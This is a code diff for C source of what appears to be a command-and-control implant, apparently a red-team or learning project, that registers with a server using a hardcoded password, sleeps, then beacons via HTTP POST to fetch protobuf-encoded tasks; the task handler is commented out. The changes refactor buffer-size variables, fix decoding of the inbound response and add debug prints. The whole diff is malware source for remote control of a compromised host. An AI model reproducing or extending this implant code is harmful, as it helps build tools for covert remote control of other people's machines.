@@ -66,8 +66,8 @@ BYTE *EncodeImplantCheckin(ImplantCheckin *ic, size_t *bufferSize) {
 }
 
 // Decode TaskRequest message
-BOOL DecodeTaskRequest(LPBYTE result, size_t out_size, TaskRequest *tReq) {
-  pb_istream_t stream = pb_istream_from_buffer(result, out_size);
+BOOL DecodeTaskRequest(LPBYTE result, size_t outboundBufferSize, TaskRequest *tReq) {
+  pb_istream_t stream = pb_istream_from_buffer(result, outboundBufferSize);
   bool status = pb_decode(&stream, TaskRequest_fields, tReq);
   if (!status) {
     DEBUG_PRINTF("Decoding failed: %s\n", PB_GET_ERROR(&stream));
@@ -203,9 +203,12 @@ int RegisterSelf() {
 
 	ri.Password = "SUPER_COMPLEX_PASSWORD_WOWZA!!!";
 
-	size_t bufferSize = 0;
-	BYTE *registerBuffer = EncodeRegisterImplant(&ri, &bufferSize);
-	LPBYTE response = SendToServer(POST_VERB, REGISTER_PATH, registerBuffer, bufferSize);
+	size_t outboundBufferSize = 0;
+    size_t inboundBufferSize = 0;
+	BYTE *registerBuffer = EncodeRegisterImplant(&ri, &outboundBufferSize);
+    DEBUG_PRINTF("outboundBufferSize = %llu\n", outboundBufferSize);
+    DEBUG_PRINTF("outboundBuffer = %s\n", registerBuffer);
+	LPBYTE response = SendToServer(POST_VERB, REGISTER_PATH, registerBuffer, outboundBufferSize, &inboundBufferSize);
 	if (strcmp((const char *)response, (const char *)REGISTRATION_SUCCESSFUL)){
 		return 0;
         }
@@ -220,15 +223,17 @@ BOOL DoCheckin(TaskResponse *tResp, TaskRequest *tReq) {
 	ic.ImplantID = (char *)ImplantID;
 	ic.Resp = tResp;
 
-	size_t bufferSize = 0;
-	BYTE *checkinBuffer = EncodeImplantCheckin(&ic, &bufferSize);
-	LPBYTE response = SendToServer(POST_VERB, CHECKIN_PATH, checkinBuffer, bufferSize);
+	size_t outboundBufferSize = 0;
+    size_t inboundBufferSize = 0;
+	BYTE *outboundBuffer = EncodeImplantCheckin(&ic, &outboundBufferSize);
+	
+    LPBYTE response = SendToServer(POST_VERB, CHECKIN_PATH, outboundBuffer, outboundBufferSize, &inboundBufferSize);
 	
 	FreeTaskResponse(tResp);
-	free(checkinBuffer);
+	free(outboundBuffer);
 	
-	if (response != NULL && bufferSize > 0) {
-		BOOL status = DecodeTaskRequest(response, bufferSize, tReq);
+	if (response != NULL && inboundBufferSize > 0) {
+		BOOL status = DecodeTaskRequest(response, inboundBufferSize, tReq);
 		free(response);
 		if (status && tReq->TaskID == NULL) {
 			// No task to perform, null out the TaskResponse
@@ -245,11 +250,10 @@ BOOL DoCheckin(TaskResponse *tResp, TaskRequest *tReq) {
 
 
 int main() {
-	DEBUG_PRINTF("Starting Implant.\n");
+	DEBUG_PRINTF("[+] Starting Implant.\n");
 	
-	int result = RegisterSelf();
-	if (result == 1) {
-		DEBUG_PRINTF("Failed to register with the Server!\n");
+	if (RegisterSelf() == 1) {
+		DEBUG_PRINTF("[!] Failed to register with the Server!\n");
 		return 1;
 	}
 	printf("[+] Successfully registered Implant with Server!\n");
@@ -261,9 +265,7 @@ int main() {
 		DEBUG_PRINTF("[+] Sleeping for %d milliseconds \n", SLEEP_TIME);
 		Sleep(SLEEP_TIME);
 		
-		BOOL checkinResult = DoCheckin(&tResp, &tReq);
-		
-		if (checkinResult && tReq.TaskID != NULL) {
+		if (DoCheckin(&tResp, &tReq) && tReq.TaskID != NULL) {
 			DEBUG_PRINTF("[+] NEW TASK RECIEVED.\n");
 			// HandleOpcode(&tReq, &tResp);
 		} else {
